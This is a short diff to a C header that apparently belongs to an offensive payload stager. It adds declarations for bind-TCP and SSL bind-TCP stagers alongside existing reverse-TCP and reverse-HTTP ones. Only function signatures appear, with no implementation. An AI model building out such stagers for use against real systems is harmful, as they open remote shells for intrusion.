@@ -50,3 +50,6 @@ void BuildURL(char *url, int checksum8);
 
 void StagerRevereTCP(wchar_t* IP, wchar_t* iPort);
 void StagerReverseHTTP(wchar_t *IP, wchar_t *iPort, wchar_t *transport);
+
+void StagerBindTCP(wchar_t* IP, wchar_t* iPort);
+void StagerBindTCPSSL(wchar_t* IP, wchar_t* iPort);
